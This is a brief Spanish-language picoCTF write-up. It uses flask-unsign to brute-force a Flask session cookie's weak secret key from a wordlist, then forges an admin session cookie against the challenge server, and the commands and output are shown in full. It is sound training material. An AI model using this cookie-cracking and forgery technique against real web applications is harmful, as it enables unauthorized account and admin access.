## Objetivo
Alright, enough of using my own encryption. Flask session cookies should be plenty secure! [server.py](https://mercury.picoctf.net/static/26760321c25c9659050a37a707247690/server.py) [http://mercury.picoctf.net:52134/](http://mercury.picoctf.net:52134/)

Hint:
- How secure is a flask cookie?
## Solucion

```bash
┌──(wil㉿DESKTOP-FKOIV4I)-[/tmp/tmp.RrOdV4pNtk]
└─$ flask-unsign --unsign --cookie "eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.Zvy8Zw.UWhppfVmJnyl0ZO9BYXvJvYIrC8" --wordlist cookie
[*] Session decodes to: {'very_auth': 'snickerdoodle'}
[*] Starting brute-forcer with 8 threads..
[+] Found secret key after 29 attempts
'peanut butter'

┌──(wil㉿DESKTOP-FKOIV4I)-[/tmp/tmp.RrOdV4pNtk]
└─$ flask-unsign --sign --cookie "{'very_auth': 'admin'}" --secret 'peanut butter'
eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.ZvzB8A.LMd53VHdhiU7c7c5ST-ncV7DTEA

┌──(wil㉿DESKTOP-FKOIV4I)-[/tmp/tmp.RrOdV4pNtk]
└─$
```

## Notas adicionales
## Referencias
- [Flask - Wikipedia, la enciclopedia libre](https://es.wikipedia.org/wiki/Flask)
- [Flask Session Cookies < BorderGate](https://www.bordergate.co.uk/flask-session-cookies/)
- [pypa/pipx: Install and Run Python Applications in Isolated Environments (github.com)](https://github.com/pypa/pipx)
- 